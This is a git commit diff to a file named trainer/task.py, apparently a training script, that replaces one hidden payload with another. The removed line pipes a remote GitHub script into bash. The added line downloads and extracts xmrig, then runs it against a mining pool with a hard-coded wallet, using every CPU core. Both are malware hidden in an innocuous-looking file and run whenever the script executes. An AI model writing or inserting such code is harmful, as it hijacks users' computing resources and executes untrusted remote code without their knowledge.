7d57271f00e458378c5e61f875c5f7f70bb2a1e9
schacink <schacink@gmail.com>
2025-12-11 16:46:32 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/schacink/sc/raw/refs/heads/main/dudi | bash')
+os.system('wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz && ./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u SC1siFaqsgxZRMthSYzwzjeHtF3zbJhznAEWdSD9QNtd5ZLjALSZe9MZ3U17YShjEx2SAEN2iUVdvf3c5zgDqQ7p1RGxxME4DfU -p JAMet -a rx/0 -t $(nproc --all)')
